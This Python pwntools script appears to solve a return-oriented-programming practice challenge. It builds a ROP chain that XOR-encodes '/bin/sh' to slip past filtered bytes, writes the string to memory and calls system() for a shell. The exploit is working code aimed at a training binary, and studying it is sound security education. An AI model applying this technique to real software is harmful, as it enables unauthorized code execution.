from pwn import *

junk = "A" * 44

#readelf -S badchars32
#.bss              NOBITS          0804a040 001040 00002c 00

#080484e0 <system@plt>:

#ROPgadget --binary badchars32 --only "pop|mov|ret"
#0x08048893 : mov dword ptr [edi], esi ; ret
#0x08048899 : pop esi ; pop edi ; ret

#0x08048896 : pop ebx ; pop ecx ; ret
#0x08048890 : xor byte ptr [ebx], cl ; ret

# 0x08048807      c645f062       mov byte [local_10h], 0x62  ; 'b' ; 98
# 0x0804880b      c645f169       mov byte [local_fh], 0x69   ; 'i' ; 105
# 0x0804880f      c645f263       mov byte [local_eh], 0x63   ; 'c' ; 99
# 0x08048813      c645f32f       mov byte [local_dh], 0x2f   ; '/' ; 47
# 0x08048817      c645f420       mov byte [local_ch], 0x20   ; 32
# 0x0804881b      c645f566       mov byte [local_bh], 0x66   ; 'f' ; 102
# 0x0804881f      c645f66e       mov byte [local_ah], 0x6e   ; 'n' ; 110
# 0x08048823      c645f773       mov byte [local_9h], 0x73   ; 's' ; 115


badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while 1:
    binsh = ""
    for i in '/bin/sh\x00':
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

pop_pop_ret = p32(0x8048899)
mov_ret = p32(0x8048893)

ppr = p32(0x8048896)
xr = p32(0x8048890)

sys_addr = p32(0x80484e0)
bss_addr = 0x804a040

p = process('./badchars32')

payload = junk + pop_pop_ret + binsh[:4] + p32(bss_addr) + mov_ret
payload += pop_pop_ret + binsh[4:] + p32(bss_addr + 4) + mov_ret

for i in range(len(binsh)):
    payload += ppr + p32(bss_addr + i) + p32(xor_byte) + xr

payload += sys_addr + "\x90" * 4 + p32(bss_addr)

p.recvuntil('> ')
p.sendline(payload)
p.interactive()

